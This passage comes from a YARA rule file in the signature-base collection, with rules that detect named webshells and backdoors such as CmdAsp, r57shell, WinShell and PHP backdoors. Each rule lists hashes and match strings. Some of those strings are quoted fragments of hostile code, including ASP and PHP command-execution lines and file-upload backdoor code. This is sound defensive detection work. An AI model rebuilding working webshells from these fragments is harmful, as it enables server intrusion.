		description = "Webshells Auto-generated - file TBack.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "b5f93621-e1e9-5aed-b574-471b4c1f9570"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7357-L7368"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a9d1007823bf96fb163ab38726b48464"
		logic_hash = "0fb43766c305f4235cc0987f411fdc3b3674723687f0b63d346429f4a7b5b87f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "\\final\\new\\lcc\\public.dll"

	condition:
		all of them
}

rule SIGNATURE_BASE_Darkspy105
{
	meta:
		description = "Webshells Auto-generated - file DarkSpy105.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "9d519ccf-fe52-5b82-a39d-c9f86c1089e1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7369-L7380"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f0b85e7bec90dba829a3ede1ab7d8722"
		logic_hash = "0f1c9dba4525f9c30f309500652ed6af647ddf492f483e101fc23c891e15fc85"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "Sorry,DarkSpy got an unknown exception,please re-run it,thanks!"

	condition:
		all of them
}

rule SIGNATURE_BASE_Editserver_EXE
{
	meta:
		description = "Webshells Auto-generated - file EditServer.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "97928144-0112-5288-8f95-acf7a0d56e71"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7381-L7394"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f945de25e0eba3bdaf1455b3a62b9832"
		logic_hash = "d440669b0c0bf575cf9dea946edf55f724300a4c765e90c631fc1eee062bf006"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Server %s Have Been Configured"
		$s5 = "The Server Password Exceeds 32 Characters"
		$s8 = "9--Set Procecess Name To Inject DLL"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Reader
{
	meta:
		description = "Webshells Auto-generated - file reader.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "d596f7f4-5b0d-5f17-94d3-2582ec041eb1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7395-L7406"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b598c8b662f2a1f6cc61f291fb0a6fa2"
		logic_hash = "89a948f8da66173965884cd525615c8eeb91cf98a4984c05be7472034bb72f76"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "mailto:mailbomb@hotmail."

	condition:
		all of them
}

rule SIGNATURE_BASE_ASP_Cmdasp
{
	meta:
		description = "Webshells Auto-generated - file CmdAsp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "e4b48843-1936-5717-b2b6-add5b4a14d04"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7407-L7420"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "79d4f3425f7a89befb0ef3bafe5e332f"
		logic_hash = "84c3148fe74b1afaa6e3bbff0aca8df1f1775759a36a673cc13d35ef7658929c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "' -- Read the output from our command and remove the temp file -- '"
		$s6 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"
		$s9 = "' -- create the COM objects that we will be using -- '"

	condition:
		all of them
}

rule SIGNATURE_BASE_PHP_Backdoor_V1
{
	meta:
		description = "Webshells Auto-generated - file PHP Backdoor v1.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f47298a9-a47c-5088-ab1f-1bd76bfd0ca8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7434-L7447"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0506ba90759d11d78befd21cabf41f3d"
		logic_hash = "396ae1ee34a06ab4863f4f54257a9020b8747fb99dff15372f0aa54fa4598e43"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "echo\"<form method=\\\"POST\\\" action=\\\"\".$_SERVER['PHP_SELF'].\"?edit=\".$th"
		$s8 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?proxy"

	condition:
		all of them
}

rule SIGNATURE_BASE_Svchostdll
{
	meta:
		description = "Webshells Auto-generated - file svchostdll.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "b369d702-1f29-56ec-a742-f87d9c42c775"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7448-L7467"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0f6756c8cb0b454c452055f189e4c3f4"
		logic_hash = "4a7a7bb7d827c2e7801f8c33b292bb3d312428fc4ae79f07e103f456984c3b83"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "InstallService"
		$s1 = "RundllInstallA"
		$s2 = "UninstallService"
		$s3 = "&G3 Users In RegistryD"
		$s4 = "OL_SHUTDOWN;I"
		$s5 = "SvcHostDLL.dll"
		$s6 = "RundllUninstallA"
		$s7 = "InternetOpenA"
		$s8 = "Check Cloneomplete"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_Server
{
	meta:
		description = "Webshells Auto-generated - file server.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "0e4fee1b-8a16-5738-9600-fa965f8c84c2"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7468-L7479"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1d38526a215df13c7373da4635541b43"
		logic_hash = "66b8513a532f64af535c948da28674795ae6495b9844165c3b039bf61c25eb46"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- PageServer Below -->"

	condition:
		all of them
}

rule SIGNATURE_BASE_Vanquish
{
	meta:
		description = "Webshells Auto-generated - file vanquish.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "143e5e46-ffbc-5aee-9f9b-13374a6c3c10"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7480-L7493"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "684450adde37a93e8bb362994efc898c"
		logic_hash = "223c59d06a9389f380fa29959c54e53a17b53080f704189ae519b9527b2c6384"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "You cannot delete protected files/folders! Instead, your attempt has been logged"
		$s8 = "?VCreateProcessA@@YGHPBDPADPAU_SECURITY_ATTRIBUTES@@2HKPAX0PAU_STARTUPINFOA@@PAU"
		$s9 = "?VFindFirstFileExW@@YGPAXPBGW4_FINDEX_INFO_LEVELS@@PAXW4_FINDEX_SEARCH_OPS@@2K@Z"

	condition:
		all of them
}

rule SIGNATURE_BASE_Winshell
{
	meta:
		description = "Webshells Auto-generated - file winshell.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "24edd03a-df71-5d84-9764-ba7903b68064"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7494-L7513"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3144410a37dd4c29d004a814a294ea26"
		logic_hash = "addbfa598039af09c0e4c50138fcfabd16c35c5516259cf9595cf49855da518d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"
		$s1 = "WinShell Service"
		$s2 = "__GLOBAL_HEAP_SELECTED"
		$s3 = "__MSVCRT_HEAP_SELECT"
		$s4 = "Provide Windows CmdShell Service"
		$s5 = "URLDownloadToFileA"
		$s6 = "RegisterServiceProcess"
		$s7 = "GetModuleBaseNameA"
		$s8 = "WinShell v5.0 (C)2002 janker.org"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Remview
{
	meta:
		description = "Webshells Auto-generated - file remview.php"
		author = "Florian Roth (Nextron Systems)"
		id = "5040ddbc-2e61-50ca-b738-a4ac8feec3f1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7514-L7527"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b4a09911a5b23e00b55abe546ded691c"
		logic_hash = "19719e8c9215ec9ba9fab55b604907e0a6d0a0507a5662926acff1e9dc03440e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\""
		$s3 = "         echo \"<script>str$i=\\\"\".str_replace(\"\\\"\",\"\\\\\\\"\",str_replace(\"\\\\\",\"\\\\\\\\\""
		$s4 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n<"

	condition:
		all of them
}

rule SIGNATURE_BASE_Saphpshell
{
	meta:
		description = "Webshells Auto-generated - file saphpshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "42bcd739-714e-5dbf-a3a1-929f3d16ed6f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7528-L7539"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d7bba8def713512ddda14baf9cd6889a"
		logic_hash = "24d558292a709bb29334b1acdc53cdb6c5bc6803caec527edcacd6a19f6dc7c9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<td><input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['command']?>"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop2006_Rar_Folder_2006Z
{
	meta:
		description = "Webshells Auto-generated - file 2006Z.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7540-L7552"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "fd1b6129abd4ab177fed135e3b665488"
		logic_hash = "4b427132541cd26ee47c387a98f6f46f86808f9a775068e1d114c9ef4abca9f6"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "wangyong,czy,allen,lcx,Marcos,kEvin1986,myth"
		$s8 = "System\\CurrentControlSet\\Control\\Keyboard Layouts\\%.8x"

	condition:
		all of them
}

rule SIGNATURE_BASE_Admin_Ad
{
	meta:
		description = "Webshells Auto-generated - file admin-ad.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "7d87b4f6-3227-53cb-803c-4f9c7327f203"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7553-L7565"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e6819b8f8ff2f1073f7d46a0b192f43b"
		logic_hash = "0febd10979a959af73332a8e064a510e949109abf863b5fd0fef19b635968d1d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "<td align=\"center\"> <input name=\"cmd\" type=\"text\" id=\"cmd\" siz"
		$s7 = "Response.write\"<a href='\"&url&\"?path=\"&Request(\"oldpath\")&\"&attrib=\"&attrib&\"'><"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Casus15
{
	meta:
		description = "Webshells Auto-generated - file casus15.php"
		author = "Florian Roth (Nextron Systems)"
		id = "305842e4-26ad-573d-8df3-e32e239e434b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7566-L7577"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8d155b4239d922367af5d0a1b89533a3"
		logic_hash = "58921290952f23ff5b828d8c92c818ebd91b726cdbbc9137b0f55a0e5ca90636"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "if((is_dir(\"$deldir/$file\")) AND ($file!=\".\") AND ($file!=\"..\"))"

	condition:
		all of them
}

rule SIGNATURE_BASE_BIN_Client
{
	meta:
		description = "Webshells Auto-generated - file Client.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "515ab1b3-7923-55de-8c19-71ef5d9b4366"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7578-L7594"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "9f0a74ec81bc2f26f16c5c172b80eca7"
		logic_hash = "e1277f6b7adc2e832a3aad96c7e44796596d2e61eb9247977da3c3569777e0b2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "=====Remote Shell Closed====="
		$s2 = "All Files(*.*)|*.*||"
		$s6 = "WSAStartup Error!"
		$s7 = "SHGetFileInfoA"
		$s8 = "CreateThread False!"
		$s9 = "Port Number Error"

	condition:
		4 of them
}

rule SIGNATURE_BASE_Shelltools_G0T_Root_Uptime
{
	meta:
		description = "Webshells Auto-generated - file uptime.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "4f649757-9502-5640-bc17-11cad6c779f4"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7595-L7610"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d1f56102bc5d3e2e37ab3ffa392073b9"
		logic_hash = "5d91dda859a63a965250bd4d76565c6adf18e4ee306be3b91965e5d35bc521e8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "JDiamondCSlC~"
		$s1 = "CharactQA"
		$s2 = "$Info: This file is packed with the UPX executable packer $"
		$s5 = "HandlereateConso"
		$s7 = "ION\\System\\FloatingPo"

	condition:
		all of them
}

rule SIGNATURE_BASE_Simple_PHP_Backdoor
{
	meta:
		description = "Webshells Auto-generated - file Simple_PHP_BackDooR.php"
		author = "Florian Roth (Nextron Systems)"
		id = "bd7c19b9-e035-5e70-b626-1d210cadc055"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7611-L7624"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a401132363eecc3a1040774bec9cb24f"
		logic_hash = "9739217c23f583452fbf1d7a8e20b2f1379ebf430e0a4fd73ad62e88d544670a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<hr>to browse go to http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=[directory he"
		$s6 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fn"
		$s9 = "// a simple php backdoor"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Sig_2005Gray
{
	meta:
		description = "Webshells Auto-generated - file 2005Gray.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "978fb04e-517d-51cf-98ca-5fd6b421365e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7625-L7639"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "75dbe3d3b70a5678225d3e2d78b604cc"
		logic_hash = "927ed5cdaa14b6cd63a6ca7d7bec6635b69fa19d88808890e7d198fb7a0b57b4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "SCROLLBAR-FACE-COLOR: #e8e7e7;"
		$s4 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
		$s8 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"
		$s9 = "SCROLLBAR-3DLIGHT-COLOR: #cccccc;"

	condition:
		all of them
}

rule SIGNATURE_BASE_Dllinjection
{
	meta:
		description = "Webshells Auto-generated - file DllInjection.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "8a57e122-fd00-57f3-94db-736c5bfd76db"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7640-L7651"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a7b92283a5102886ab8aee2bc5c8d718"
		logic_hash = "6e01ae1cc8a91a5e0d22bdf477aa72bf0116dbe31752a069b1e34d8a09ec6213"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "\\BDoor\\DllInjecti"

	condition:
		all of them
}

rule SIGNATURE_BASE_Mithril_V1_45_Mithril
{
	meta:
		description = "Webshells Auto-generated - file Mithril.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "3c160017-0332-532a-bb7f-390a4a34dc4e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7652-L7664"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f1484f882dc381dde6eaa0b80ef64a07"
		logic_hash = "a3e74bfb34762553eccaddd745d9e17dc3a5a25201e4bc9e2ea9a49342295c78"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "cress.exe"
		$s7 = "\\Debug\\Mithril."

	condition:
		all of them
}

rule SIGNATURE_BASE_Hkshell_Hkrmv
{
	meta:
		description = "Webshells Auto-generated - file hkrmv.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "986fad12-9198-5e0a-88d6-a9be6963ff8c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7665-L7677"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "bd3a0b7a6b5536f8d96f50956560e9bf"
		logic_hash = "f1da0778456272e6d93633a564018bdf0fa74f1db1c9e963a03a59c69c752b6e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "/THUMBPOSITION7"
		$s6 = "\\EvilBlade\\"

	condition:
		all of them
}

rule SIGNATURE_BASE_WEBSHELL_PHP_1
{
	meta:
		description = "Webshells Auto-generated - file phpshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "d0107af3-e484-54cf-a238-dd1e71efd3f6"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "phpshell"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7678-L7692"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1dccb1ea9f24ffbd085571c88585517b"
		logic_hash = "eed450ae6668bbee01ea2689e9864f10a66714ec4c91afabb12609ad4ebdac8c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "echo \"<input size=\\\"100\\\" type=\\\"text\\\" name=\\\"newfile\\\" value=\\\"$inputfile\\\"><b"
		$s2 = "$img[$id] = \"<img height=\\\"16\\\" width=\\\"16\\\" border=\\\"0\\\" src=\\\"$REMOTE_IMAGE_UR"
		$s3 = "$file = str_replace(\"\\\\\", \"/\", str_replace(\"//\", \"/\", str_replace(\"\\\\\\\\\", \"\\\\\", "

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Cmd
{
	meta:
		description = "Webshells Auto-generated - file cmd.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "f7a74f21-aec9-5ee7-a80e-0fe34b977a71"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7693-L7705"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cbe8e365d41dd3cd8e462ca434cf385f"
		logic_hash = "43f3379a57210f0e3b70575313115a7ba3d71359de7c5ac9a6a178b93af3545e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>"
		$s1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"

	condition:
		all of them
}

rule SIGNATURE_BASE_Felikspack3___PHP_Shells_Phpft
{
	meta:
		description = "Webshells Auto-generated - file phpft.php"
		author = "Florian Roth (Nextron Systems)"
		id = "00bc690b-4977-5076-a40a-edd39c37233f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7706-L7718"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "60ef80175fcc6a879ca57c54226646b1"
		logic_hash = "741536acafdc4da618d69bdae2f0a3e8c004a4027cc76c796158ee111c006414"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "PHP Files Thief"
		$s11 = "http://www.4ngel.net"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Indexer
{
	meta:
		description = "Webshells Auto-generated - file indexer.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "fba053d7-5413-563f-8c27-0554349500b2"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7719-L7730"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "135fc50f85228691b401848caef3be9e"
		logic_hash = "a1bfba9c24819f5c1574aa179d853a6cc2fcf58c7b9a14eeab2639248178549c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input type=\"r"

	condition:
		all of them
}

rule SIGNATURE_BASE_R57Shell
{
	meta:
		description = "Webshells Auto-generated - file r57shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "1f1070e8-e82c-5cae-a64a-cd5028adae97"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7731-L7742"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8023394542cddf8aee5dec6072ed02b5"
		logic_hash = "40ff6bceb3f9bd95fbf5e75681fadadaa64243007e10fcc86bb909282b8161c5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s11 = " $_POST['cmd']=\"echo \\\"Now script try connect to"

	condition:
		all of them
}

rule SIGNATURE_BASE_Bdcli100
{
	meta:
		description = "Webshells Auto-generated - file bdcli100.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "c74e8822-9556-5596-a130-c6e0120d7103"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7743-L7755"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b12163ac53789fb4f62e4f17a8c2e028"
